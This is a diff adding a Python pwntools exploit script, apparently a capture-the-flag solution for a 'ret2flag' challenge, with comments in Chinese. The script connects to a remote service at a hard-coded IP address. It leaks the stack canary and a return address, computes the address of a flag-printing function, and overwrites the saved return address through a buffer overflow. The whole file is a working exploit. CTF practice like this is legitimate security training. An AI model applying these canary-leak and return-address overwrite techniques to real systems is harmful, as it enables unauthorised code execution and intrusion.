@@ -1,0 +1,97 @@
+#!/usr/bin/env python3
+from pwn import *
+import struct
+
+canary = b""
+
+# elf = ELF('./ret2flag')
+
+# 取得 putFlag 的偏移量
+offset = 0x20D
+
+# 連接遠端伺服器
+io = remote('140.113.207.245', 30174)
+
+# 構造輸入 A*24
+payload = b"A" * 24
+io.sendline(payload)
+
+# 接收程式輸出，直到包含 "Your password is"
+output = io.recvuntil(b"Your password is ")
+
+# 接收 buf 的內容，直到 "Password is incorrect"
+buf_content = io.recvuntil(b"Password is incorrect")
+buf_content = buf_content.replace(b"Password is incorrect", b"")
+
+seven_bytes = buf_content[len(payload):len(payload) + 8]
+
+seven_bytes = b"\x00" + seven_bytes[1:]
+print(f"[+] Seven Bytes with \\x00 prefix: {seven_bytes}")
+
+# 將 seven_bytes 轉換為十六進制字符串
+seven_bytes_hex = seven_bytes.hex()
+print(f"[+] Seven Bytes with \\x00 prefix: {seven_bytes_hex}")
+
+# payload = b"A" * 24 + seven_bytes + b"A" * 8 + putFlag
+payload = b"A" * 39
+
+sleep(0.5)  # 等待程式處理輸入
+io.sendline(payload)
+
+output = io.recvuntil(b"Your password is ")
+
+buf_content = io.recvuntil(b"Password is incorrect")
+buf_content = buf_content.replace(b"Password is incorrect", b"")
+
+print(f"[+] Buffer Content: {buf_content.hex()}")
+
+rip = buf_content[len(payload)+1:len(payload) + 8]
+
+# 將 rip 轉換為整數
+rip_int = int.from_bytes(rip, byteorder='little')
+print(f"[+] rip (int): {hex(rip_int)}")
+
+# 計算結果
+result = rip_int - offset
+print(f"[+] Result (int): {hex(result)}")
+
+payload = b"A" * 24 + seven_bytes + b'A' * 8 + p64(result)
+
+sleep(0.5)  # 等待程式處理輸入
+io.sendline(payload)
+output = io.recvuntil(b"Your password is ")
+
+buf_content = io.recvuntil(b"Password is incorrect")
+buf_content = buf_content.replace(b"Password is incorrect", b"")
+print(f"[+] Buffer Content: {buf_content.hex()}")
+
+sleep(0.5)  # 等待程式處理輸入
+io.sendline(payload)
+output = io.recvuntil(b"Your password is ")
+
+buf_content = io.recvuntil(b"Password is incorrect")
+buf_content = buf_content.replace(b"Password is incorrect", b"")
+print(f"[+] Buffer Content: {buf_content.hex()}")
+
+sleep(0.5)  # 等待程式處理輸入
+io.sendline(payload)
+output = io.recvuntil(b"Your password is ")
+
+buf_content = io.recvuntil(b"Password is incorrect")
+buf_content = buf_content.replace(b"Password is incorrect", b"")
+print(f"[+] Buffer Content: {buf_content.hex()}")
+
+# 接收並打印回應
+response = io.recvall(timeout=5).decode()
+# 過濾並打印以 "CSC2025" 開頭的行
+for line in response.splitlines():
+    line = line.strip()  # 去除行首尾空白
+    # 檢查行是否以 "CSC2025" 開頭
+    # 如果是，則打印該行
+    # 這裡假設 flag 是以 "CSC2025" 開頭的
+    print(line)
+    if line.startswith("> CSC2025"):
+        print(line)
+# io.interactive()
+# 關閉程式
+io.close()
